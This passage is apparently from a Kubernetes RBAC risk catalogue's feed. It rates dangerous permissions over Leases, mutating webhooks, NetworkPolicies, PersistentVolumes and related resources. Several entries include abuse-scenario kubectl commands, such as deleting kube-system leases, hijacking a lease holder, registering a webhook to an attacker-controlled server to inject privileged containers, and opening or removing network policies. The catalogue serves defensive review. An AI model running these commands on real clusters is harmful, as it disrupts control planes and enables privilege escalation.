 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>coordination.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>leases&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete, get, list&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-controlplanedisruption">&lt;a href="https://rbac-atlas.github.io/tags/controlplanedisruption/">ControlPlaneDisruption&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-leaderelectionabuse">&lt;a href="https://rbac-atlas.github.io/tags/leaderelectionabuse/">LeaderElectionAbuse&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows managing Lease objects across all namespaces. Leases are used for leader election by control plane components and controllers. Tampering with leases can disrupt critical cluster operations, cause denial of service, or potentially force a malicious controller to become a leader.&lt;/p></description></item><item><title>Manage Leases in kube-system or kube-node-lease namespace</title><link>https://rbac-atlas.github.io/rules/1081/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1081/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1081&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Leases in kube-system or kube-node-lease namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>coordination.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>leases&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-controlplanedisruption">&lt;a href="https://rbac-atlas.github.io/tags/controlplanedisruption/">ControlPlaneDisruption&lt;/a>&lt;/span>
 &lt;span class="tag-criticalnamespace">&lt;a href="https://rbac-atlas.github.io/tags/criticalnamespace/">CriticalNamespace&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows managing Lease objects in critical namespaces like &amp;lsquo;kube-system&amp;rsquo; or &amp;lsquo;kube-node-lease&amp;rsquo;. This is highly critical as it can disrupt core Kubernetes components, lead to node instability, or denial of service.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Delete a critical Lease object in the &amp;lsquo;kube-system&amp;rsquo; namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete lease &amp;lt;lease-name&amp;gt; -n kube-system
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete lease kube-scheduler -n kube-system&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Update a Lease object to extend its holder identity, potentially hijacking leadership.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This is complex and requires knowing the current lease holder and its acquireTime.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># It&amp;#39;s more of an API interaction than a simple kubectl command.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl patch lease &amp;lt;lease-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type=&amp;#39;json&amp;#39; -p=&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/holderIdentity&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;malicious-controller&amp;#34;}]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl patch lease &amp;lt;lease-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/holderIdentity&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;malicious-controller&amp;#34;}]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage MutatingWebhookConfigurations</title><link>https://rbac-atlas.github.io/rules/1043/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1043/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1043&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage MutatingWebhookConfigurations&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>admissionregistration.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>mutatingwebhookconfigurations&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-webhookmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/webhookmanipulation/">WebhookManipulation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants control over MutatingWebhookConfigurations, which can modify API objects during admission. This is extremely critical as an attacker can create or alter webhooks to inject malicious configurations, escalate privileges, bypass security policies, or cause denial of service.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new MutatingWebhookConfiguration to inject privileged containers into pods.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: admissionregistration.k8s.io/v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: MutatingWebhookConfiguration
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: privileged-injector
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">webhooks:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">- name: privileged-injector.example.com
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> clientConfig:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> url: &amp;#34;https://&amp;lt;malicious-webhook-server&amp;gt;/mutate&amp;#34; # Attacker-controlled server
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> caBundle: &amp;lt;base64-encoded-ca-cert&amp;gt; # Self-signed CA for attacker&amp;#39;s server
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> rules:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - operations: [&amp;#34;CREATE&amp;#34;]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> apiGroups: [&amp;#34;&amp;#34;]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> apiVersions: [&amp;#34;v1&amp;#34;]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> resources: [&amp;#34;pods&amp;#34;]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> admissionReviewVersions: [&amp;#34;v1&amp;#34;, &amp;#34;v1beta1&amp;#34;]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> sideEffects: None
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> failurePolicy: Ignore # To avoid breaking legitimate operations
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete a critical MutatingWebhookConfiguration, potentially bypassing security policies.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete mutatingwebhookconfiguration &amp;lt;webhook-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete mutatingwebhookconfiguration pod-defaults-webhook&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage NetworkPolicies cluster-wide</title><link>https://rbac-atlas.github.io/rules/1071/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1071/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1071&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage NetworkPolicies cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>NetworkManipulation&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>networking.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>networkpolicies&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-networkpolicymanagement">&lt;a href="https://rbac-atlas.github.io/tags/networkpolicymanagement/">NetworkPolicyManagement&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, modifying, or deleting NetworkPolicies in any namespace. This can be used to disable network segmentation, allow/deny traffic to sensitive pods, or isolate critical components, leading to information disclosure, lateral movement, or denial of service.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a NetworkPolicy to allow all ingress traffic to pods in a namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: networking.k8s.io/v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: NetworkPolicy
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: allow-all-ingress
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> podSelector: {} # Selects all pods in the namespace
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> policyTypes:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - Ingress
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> ingress:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - {} # Allows all ingress
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n production -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete a critical NetworkPolicy, removing network segmentation.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete networkpolicy &amp;lt;networkpolicy-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete networkpolicy deny-all-ingress -n default&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage NetworkPolicies in a namespace</title><link>https://rbac-atlas.github.io/rules/1072/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1072/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1072&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage NetworkPolicies in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>NetworkManipulation&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>networking.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>networkpolicies&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-networkpolicymanagement">&lt;a href="https://rbac-atlas.github.io/tags/networkpolicymanagement/">NetworkPolicyManagement&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits creating, modifying, or deleting NetworkPolicies within a specific namespace. This allows control over network traffic flow for applications within that namespace, potentially bypassing intended segmentation or causing denial of service.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a NetworkPolicy to allow all ingress traffic to pods in the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: networking.k8s.io/v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: NetworkPolicy
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: allow-all-ingress-ns
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> podSelector: {}
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> policyTypes:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - Ingress
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> ingress:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - {}
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n default -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete a NetworkPolicy within the namespace, removing segmentation.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete networkpolicy &amp;lt;networkpolicy-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete networkpolicy db-isolation -n production&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage PersistentVolumes (cluster-wide storage manipulation)</title><link>https://rbac-atlas.github.io/rules/1017/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1017/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1017&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage PersistentVolumes (cluster-wide storage manipulation)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>persistentvolumes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete, deletecollection&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-dataloss">&lt;a href="https://rbac-atlas.github.io/tags/dataloss/">DataLoss&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-storagemanipulation">&lt;a href="https://rbac-atlas.github.io/tags/storagemanipulation/">StorageManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits creating, updating, patching, or deleting PersistentVolumes across the cluster. This allows manipulation of cluster-wide storage, potentially leading to data exposure by accessing sensitive data, data loss by deleting volumes, tampering with stored information, or denial of service.&lt;/p></description></item><item><title>Manage PodDisruptionBudgets cluster-wide</title><link>https://rbac-atlas.github.io/rules/1079/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1079/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1079&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage PodDisruptionBudgets cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Denial of Service&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>policy&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>poddisruptionbudgets&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-availabilityimpact">&lt;a href="https://rbac-atlas.github.io/tags/availabilityimpact/">AvailabilityImpact&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting PodDisruptionBudgets (PDBs) cluster-wide. Maliciously configured PDBs (e.g., setting maxUnavailable to 0 for critical components) can prevent voluntary disruptions, or conversely, allow too many disruptions, leading to denial of service or impacting application availability.&lt;/p></description></item><item><title>Manage PriorityLevelConfigurations (API Server DoS/Manipulation)</title><link>https://rbac-atlas.github.io/rules/1099/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1099/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1099&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage PriorityLevelConfigurations (API Server DoS/Manipulation)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Denial of Service&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>flowcontrol.apiserver.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>prioritylevelconfigurations&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-apiserverdos">&lt;a href="https://rbac-atlas.github.io/tags/apiserverdos/">APIServerDoS&lt;/a>&lt;/span>
 &lt;span class="tag-controlplanedisruption">&lt;a href="https://rbac-atlas.github.io/tags/controlplanedisruption/">ControlPlaneDisruption&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
